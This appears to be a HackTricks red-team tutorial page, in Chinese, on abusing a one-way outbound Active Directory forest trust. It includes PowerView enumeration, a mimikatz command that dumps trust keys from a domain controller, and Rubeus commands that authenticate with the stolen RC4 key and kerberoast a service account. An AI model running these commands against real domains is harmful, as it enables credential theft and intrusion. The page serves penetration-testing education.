# 外部森林域 - 单向（出站）

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

在这种情况下，**您的域**正在信任来自**不同域**的某些**权限**。

## 枚举

### 出站信任
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## 信任账户攻击

当从域 _B_ 向域 _A_ 设置 Active Directory 域或林信任时（_**B**_ 信任 A），在域 **A** 中创建了一个名为 **B** 的信任账户。**Kerberos 信任密钥**，由**信任账户的密码**衍生，用于**加密域间 TGTs**，当域 A 的用户请求域 B 中服务的服务票据时。

可以使用以下方法从域控制器获取受信任账户的密码和哈希：
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
风险在于，由于信任账户 B$ 已启用，**B$ 的主要群组是域 A 的域用户**，授予域用户的任何权限都适用于 B$，并且可以使用 B$ 的凭据对域 A 进行认证。

{% hint style="warning" %}
因此，**从信任域可以获得受信任域内的用户**。这个用户可能没有很多权限（可能只是域用户），但你将能够**枚举外部域**。
{% endhint %}

在此示例中，信任域是 `ext.local`，受信任的域是 `root.local`。因此，在 `root.local` 内创建了一个名为 `EXT$` 的用户。
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
因此，此时已经拥有 **`root.local\EXT$`** 的当前**明文密码和Kerberos密钥。** **`root.local\EXT$`** 的Kerberos AES密钥与AES信任密钥不同，因为使用了不同的盐值，但是**RC4密钥是相同的**。因此，我们可以**使用从ext.local导出的RC4信任密钥**来作为`root.local\EXT$` 对 `root.local` 进行**认证**。
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
使用这个方法，你可以开始枚举该域，甚至对用户进行kerberoasting：
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### 收集明文信任密码

在之前的流程中，使用了信任哈希而不是**明文密码**（也是由mimikatz**转储**的）。

明文密码可以通过将mimikatz的\[ CLEAR ]输出从十六进制转换并移除空字节‘\x00’来获得：

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

有时在创建信任关系时，用户必须输入信任的密码。在此演示中，关键是原始信任密码，因此是人类可读的。随着密钥周期（30天），明文将不再是人类可读的，但技术上仍然可用。

明文密码可以用来执行常规认证作为信任账户，这是请求使用信任账户的Kerberos密钥的TGT的另一种方法。这里，从ext.local查询root.local的Domain Admins成员：

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## 参考资料

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
